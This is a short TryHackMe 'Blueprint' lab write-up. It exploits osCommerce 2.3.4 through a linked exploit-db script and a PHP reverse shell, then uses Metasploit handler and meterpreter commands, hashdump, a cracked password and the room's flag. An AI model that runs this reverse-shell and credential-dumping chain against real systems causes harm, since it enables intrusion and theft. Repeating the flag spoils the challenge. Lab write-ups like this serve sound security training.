# Matheus Jesus 06-04-2020

## Try Hack Me - [Blueprint](https://tryhackme.com/room/blueprint)

## REF https://www.embeddedhacker.com/2019/12/hacking-walkthrough-thm-blueprint/

## IP 10.10.105.165

### 8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)

### exploit-db on OSCommerce CMS - [Here](https://www.exploit-db.com/exploits/44374)

### Exploiting

Download script from exploit-db

Change IP Addresses

Reverse shell on PHP

Run script -> access page to execute script (http://10.10.105.165:8080/oscommerce-2.3.4/catalog/install/includes/configure.php)

### Metasploit

```text
use multi/handler
set payload windows/shell/reverse_tcp
set lhost tun0
set lport 1234
run
```

```text
use multi/manage/shell_to_meterpreter
set SESSION 1
set LPORT 4433
run
```

run hashdump

### Crack Hash

get hash for Lab user
Crack online (because rockyou.txt does not contain the word)
password -> googleplus

### Back to Metasploit

```text
search -f root.txt*
```

Found it on c:\Users\Administrator\Desktop\root.txt.txt

THM{aea1e3ce6fe7f89e10cea833ae009bee}
